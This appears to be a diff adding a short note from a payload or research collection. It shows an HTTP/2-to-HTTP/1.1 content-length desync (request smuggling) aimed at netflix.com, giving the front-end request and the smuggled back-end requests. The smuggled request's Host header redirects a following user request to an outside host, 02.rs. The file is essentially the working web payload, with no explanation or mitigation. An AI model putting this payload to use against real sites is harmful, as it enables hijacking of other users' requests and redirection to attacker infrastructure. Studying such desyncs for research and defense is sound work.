@@ -1,0 +1,22 @@
+# H2.CL Desync
+##Front-End:
+method=POST
+path=/n
+authority=netflix.com
+content-length=4
+abcdGET /n HTTP/1.1
+Host: 02.rs?x.netflix.com
+Foo: bar
+
+method=GET
+path=/anything
+authority=netflix.com
+
+##Back End:
+POST /n HTTP/1.1
+Host: www.netflix.com
+Content-Length: 4
+abcdGET /n HTTP/1.1
+Host: 02.rs?x.netflix.com
+Foo: barGET /anything HTTP/1.1
+Host: www.netflix.com
